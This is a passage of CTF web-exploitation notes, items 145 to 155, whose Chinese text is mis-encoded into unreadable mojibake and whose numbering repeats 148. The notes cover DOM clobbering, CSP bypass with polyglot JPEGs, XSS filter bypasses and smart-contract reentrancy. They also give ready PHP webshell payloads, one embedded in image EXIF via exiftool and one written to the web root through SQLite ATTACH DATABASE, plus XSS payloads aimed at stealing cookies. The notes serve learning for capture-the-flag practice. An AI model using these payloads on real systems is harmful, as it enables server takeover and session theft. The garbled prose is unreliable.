148. [DomPurify.sanitize](https://cloud.tencent.com/developer/article/1825938)è¿‡æ»¤ä¸‹çš„xssã€‚sanitizeåªå…è®¸åˆ›å»º`[div,a,span,p]`htmlæ ‡ç­¾å’Œå±æ€§`[style,id,name,href]`ï¼Œè¿™ç§æƒ…å†µä¸‹åœ¨æ²¡æœ‰ç”¨æˆ·äº¤äº’çš„å‰æä¸‹æ˜¯ä¸å¯èƒ½æˆåŠŸæ‰§è¡Œæœ‰ç”¨çš„xssçš„ã€‚ä¸è¿‡æ—¢ç„¶å¼€æ”¾äº†ä¸€äº›æ ‡ç­¾ï¼Œå¯ä»¥è€ƒè™‘[dom clobbering](https://ljdd520.github.io/2020/03/14/DOM-Clobbering%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)ã€‚ä¾‹å¦‚åœ¨æ’å…¥`<p id='test'>`è¿™ä¸ªæ ‡ç­¾åï¼Œåœ¨jsé‡Œå¯ä»¥é€šè¿‡`test`æˆ–è€…`window.test`æ¥è·å–åˆ°å®ƒã€‚è¿™æ„å‘³ç€ï¼š

```js
if(user.isAdmin){
    //æœŸæœ›æ‰§è¡Œé€»è¾‘
}
```

è¿™æ ·çš„ä»£ç å¯ä»¥é€šè¿‡åˆ›å»º`"<a/id='user'><a/id='user'/name=isAdmin>"@g.com`æ¥è¦†ç›–åŸæœ¬çš„`user.isAdmin`ï¼Œä½¿å…¶è¿›å…¥ifè¯­å¥ï¼ˆè¿™é‡Œpayloadçš„`/`å’Œ`@g.com`æ˜¯å› ä¸ºé¢˜ç›®è¦æ±‚è¾“å…¥å†…å®¹ä¸ºé‚®ç®±ï¼ŒåŠ å…¥`/`ä»£æ›¿ç©ºæ ¼ä½¿å…¶ç¬¦åˆé‚®ç®±æ ¼å¼ï¼‰ã€‚æ³¨æ„æ— éœ€ç»™å…¶èµ‹å€¼ï¼Œè®©å®ƒå­˜åœ¨å¹¶è¦†ç›–åŸæ¥çš„å°±è¡Œã€‚
145. ç»•è¿‡getimagesizeï¼ˆå°†jsä»£ç æ’å…¥æœ‰æ•ˆå›¾ç‰‡ï¼‰+ç»•è¿‡csp `script-src 'self'`ã€‚å¯ç›´æ¥ä½¿ç”¨è¿™ç¯‡[æ–‡ç« ](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs)çš„pocå›¾ç‰‡ï¼Œhex editoræ‰“å¼€å›¾ç‰‡æ‰¾åˆ°`alert`ä»£ç å³å¯å°†å…¶æ¢ä¸ºä»»æ„å…¶ä»–jsä»£ç ã€‚
146. phpçš„includeå‡½æ•°åŒ…å«æœ¨é©¬æ—¶ï¼Œæœ¨é©¬æ–‡ä»¶çš„åç¼€åæ— éœ€æ˜¯phpï¼Œjpgç­‰ä¹Ÿè¡Œï¼Œåªè¦å›¾ç‰‡æ–‡ä»¶é‡ŒåŒ…å«phpæœ¨é©¬ä»£ç ã€‚å¯ä»¥è€ƒè™‘ç”¨exiftoolæŠŠæœ¨é©¬å†™åˆ°æ³¨é‡Šé‡Œï¼š`exiftool img.jpg -Comment="<?=system(\$_GET[0]);die();?>"`ã€‚
147. php [realpath](https://www.php.net/manual/zh/function.realpath.php)å‡½æ•°åœ¨å‚æ•°è·¯å¾„å¼€å¤´ä¸º`file:///`æ—¶ï¼Œä¼šè¿”å›ç©ºå­—ç¬¦ä¸²ã€‚
148. sqliteåˆ©ç”¨æŸ¥è¯¢è¯­å¥å†™å…¥php shellæ–‡ä»¶ã€‚è¦æ³¨æ„ATTACH DATABASEçš„è·¯å¾„éœ€è¦å¯è¯»å¯å†™ã€‚

```sql
ATTACH DATABASE '/var/www/html/socengexpasdf.php' AS socengexpasdf;
CREATE TABLE socengexpasdf.pwn (dataz text);
INSERT INTO socengexpasdf.pwn VALUES ('<? system($_GET["cmd"]); ?>');
```

[ATTACH DATABASE](https://www.runoob.com/sqlite/sqlite-attach-database.html)é™„åŠ æ•°æ®åº“`/var/www/html/socengexpasdf.php`ï¼Œå› ä¸ºè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ•…ä¼šåœ¨/var/www/html/ä¸‹åˆ›å»ºä¸€ä¸ªsocengexpasdf.phpï¼Œåˆ«åä¸ºsocengexpasdfï¼Œä¸‹é¢çš„è¯­å¥éƒ½æ˜¯åŸºäºåˆ«åæ¥æ“ä½œçš„ã€‚[CREATE TABLE](https://www.runoob.com/sqlite/sqlite-create-table.html)åœ¨åˆšæ‰æŒ‡å®šçš„socengexpasdfæ•°æ®åº“ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºpwnçš„è¡¨ï¼Œ(dataz text)æŒ‡å®šæ•°æ®ç±»å‹ã€‚[INSERT INTO](https://www.runoob.com/sqlite/sqlite-insert.html)æ’å…¥shellä»£ç ã€‚
149. æ ¹æ®æŸ¥è¯¢ç»“æœé‡å®šå‘ä¸åŒçš„urlçš„è®¾è®¡åŠ ä¸Šä¸å®‰å…¨çš„cookieè®¾ç½®ï¼ˆSameSite: None;Secure: false:ï¼‰å¯èƒ½æœ‰[XS-leak](https://xsleaks.dev/)ã€‚ä¾‹é¢˜:[secrets](../../../../CTF/HackTM%20CTF/Web/secrets.md)ï¼Œæ­¤é¢˜çš„é¢„æœŸè§£ä¸º[Cross-Origin Redirects and CSP Violations](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)ï¼Œéé¢„æœŸè§£åˆ™æ˜¯åˆ©ç”¨äº†chromeçš„urlå¤§å°æœ€å¤§ä¸º2MBçš„é™åˆ¶ã€‚
150. åˆ©ç”¨sql [like](https://www.runoob.com/sql/sql-like.html)è¯­å¥çˆ†ç ´code+åˆ©ç”¨BeautifulSoupä¸æµè§ˆå™¨è§£æhtmlçš„åŒºåˆ«ç»•è¿‡xssè¿‡æ»¤+åˆ©ç”¨www.youtube.comçš„[JSONP](https://www.zhihu.com/question/19966531)ç»•è¿‡CSPé™åˆ¶ã€‚ä¾‹é¢˜:[Crocodilu](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu)ã€‚é¢˜ç›®è¦æ±‚æ¿€æ´»ç”¨æˆ·éœ€è¦è¾“å…¥codeï¼Œä½†codeæ˜¯4ä½éšæœºæ•°å­—ä¸”ä¸€ä¸ªé‚®ç®±è´¦å·å› ä¸º[redis](https://zhuanlan.zhihu.com/p/51608696)çš„é™åˆ¶åªå…è®¸çˆ†ç ´ä¸€æ¬¡ã€‚æ¼æ´ä»£ç ä¸ºä¸‹é¢çš„sqlè¯­å¥ï¼š

```sql
SELECT * FROM users WHERE email LIKE "email" AND code LIKE "code"
```

ä¸”é‚®ç®±éªŒè¯ä»£ç ä½¿ç”¨äº†pythonçš„re.matchï¼š

- If zero or more characters at the beginning of string match the regular expression pattern, return a corresponding match object. Return None if the string does not match the pattern; note that this is different from a zero-length match. 

å…è®¸æˆ‘ä»¬åœ¨æ­£ç¡®æ ¼å¼çš„é‚®ç®±æœ«å°¾æ·»åŠ sqlé‡Œçš„é€šé…ç¬¦%ã€‚åªè¦æˆ‘ä»¬åœ¨è¾“å…¥é‚®ç®±æ—¶åŸºäºåŸæ¥çš„é‚®ç®±ä¸åœåœ¨æœ«å°¾æ·»åŠ %ï¼Œredisä¸ä¼šå°†å…¶è¯†åˆ«ä¸ºåŒä¸€ä¸ªé‚®ç®±ï¼Œä½†sqlæŸ¥è¯¢æ—¶ä¼šï¼ŒæˆåŠŸç»•è¿‡ä¸€ä¸ªé‚®ç®±è´¦å·åªèƒ½çˆ†ç ´ä¸€æ¬¡çš„éš¾é¢˜ã€‚

å…³äºBeautifulSoupï¼Œå¯¹äºä¸‹é¢çš„ç»“æ„ï¼š

```html
<!--><script>alert(1)</script>-->
```

BeautifulSoupä¼šå°†å…¶è§£æä¸ºæ³¨é‡Šï¼Œä½†æµè§ˆå™¨ä¼šå°†å…¶è§£æä¸ºscriptï¼ŒæˆåŠŸæ‰§è¡Œä»£ç ã€‚

151. åˆ©ç”¨jQuery loadå‡½æ•°çš„ç‰¹æ€§æ‰§è¡Œxssã€‚ä¾‹é¢˜:[Hades](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/hades)ã€‚æ­¤é¢˜çš„å…³é”®ä»£ç åœ¨äºï¼š

```js
$('#ajax-load').load('/ajax/articles?cat=news');
```

å…¶ä¸­newså¯æ§ã€‚å¦‚æœæˆ‘ä»¬æ„é€ paylaod:`/ajax/articles?cat=asdf"x="`ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ï¼š

```html
<noscript>
    If you can't see anything, you have to enable javascript
    <img src="/images/error.jpg" alt="selected category asdf"x="" />
</noscript>
```

ç»™imgæ³¨å…¥äº†ä¸€ä¸ªå±æ€§ï¼Œä½†æ˜¯å› ä¸º[<noscript>](https://www.runoob.com/tags/tag-noscript.html)æ ‡ç­¾çš„å­˜åœ¨ï¼Œæ— æ³•æ‰§è¡Œxssã€‚äºæ˜¯æ ¹æ®jQuery[æ–‡æ¡£](https://api.jquery.com/load/)ï¼Œåˆ©ç”¨loadå‡½æ•°çš„æå–æ ‡ç­¾ç‰¹æ€§æˆåŠŸç›—å–cookieã€‚

152. flask sessionå¯†é’¥çˆ†ç ´å·¥å…·ï¼š[flask-unsign](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask#flask-unsign)ã€‚ä¾‹é¢˜:[Chocholates](https://eszfrigyes.com/2023/02/ctf-writeup-chocolates-mhsctf2023/)
153. æ™ºèƒ½åˆçº¦ï¼ˆ[solidity](https://docs.soliditylang.org/en/v0.8.17/index.html)è¯­è¨€ï¼‰åˆæ¢ã€‚ä¾‹é¢˜:[Guess The Name](https://github.com/skabdulhaq/CTF-learnings/blob/main/CTF-writeups/BytesbanditCTF/blockchain-GuessTheName.md)ã€‚æ­¤é¢˜ä»£ç å¾ˆç®€å•ï¼Œè§£æ³•æ˜¯è‡ªå·±å†™å¦ä¸€ä¸ªåˆçº¦ï¼Œå†…éƒ¨æ ¹æ®Challengeåˆçº¦é‡Œå·²æœ‰çš„æ¥å£é‡å†™æ–¹æ³•ï¼Œä½¿å…¶è¿”å›Trueï¼›ç„¶åè¿ä¸Šé¢˜ç›®æä¾›çš„Challengeåˆçº¦ï¼Œä½¿ç”¨[msg.sender](https://stackoverflow.com/questions/48562483/solidity-basics-what-msg-sender-stands-for)åœ°å€[é‡Šæ”¾](https://www.web3.university/tracks/create-a-smart-contract/deploy-your-first-smart-contract)åˆšæ‰çš„å†™çš„åˆçº¦ã€‚Challengeåˆçº¦è°ƒç”¨é‡å†™çš„å‡½æ•°ï¼Œè·å–flagã€‚

åœ¨[ctf wiki](https://ctf-wiki.org/blockchain/ethereum/basics/#txorigin-vs-msgsender)çœ‹è§äº†msg.senderçš„è¯¦ç»†è§£é‡Šã€‚msg.sender æ˜¯å‡½æ•°çš„ç›´æ¥è°ƒç”¨æ–¹ï¼Œåœ¨ç”¨æˆ·æ‰‹åŠ¨è°ƒç”¨è¯¥å‡½æ•°æ—¶æ˜¯å‘èµ·äº¤æ˜“çš„è´¦æˆ·åœ°å€ï¼Œä½†ä¹Ÿå¯ä»¥æ˜¯è°ƒç”¨è¯¥å‡½æ•°çš„ä¸€ä¸ªæ™ºèƒ½åˆçº¦çš„åœ°å€ã€‚ç»™å®šè¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼Œå¦‚ç”¨æˆ·é€šè¿‡åˆçº¦ A è°ƒåˆçº¦ Bï¼Œæ­¤æ—¶å¯¹äºåˆçº¦ A : msg.sender æ˜¯ç”¨æˆ·ï¼›å¯¹äºåˆçº¦ B : msg.sender æ˜¯åˆçº¦ A

154. [Tor](https://zh.wikipedia.org/zh-cn/Tor)å¯ä»¥è®¿é—®ä»¥onionç»“å°¾çš„ç½‘ç«™ã€‚ä¾‹é¢˜:[Hash Browns](https://medium.com/@vj35.cool/the-bytebandits-ctf-2023-449a2d64c7b4)
155. onERC721Receivedå›è°ƒå‡½æ•°å¯èƒ½è§¦å‘[Re-Entrancy Attack](https://steemit.com/cn/@chenlocus/reentrancy)ï¼ˆé‡å…¥æ”»å‡»ï¼Œç‰¹å¾ä¸ºå…ˆæ“ä½œåæ”¹çŠ¶æ€ï¼‰+js/pythoné‡Šæ”¾åˆçº¦ã€‚ä¾‹é¢˜:[Dragon Slayer](../../CTF/HackTM%20CTF/Web/Dragon%20Slayer.md)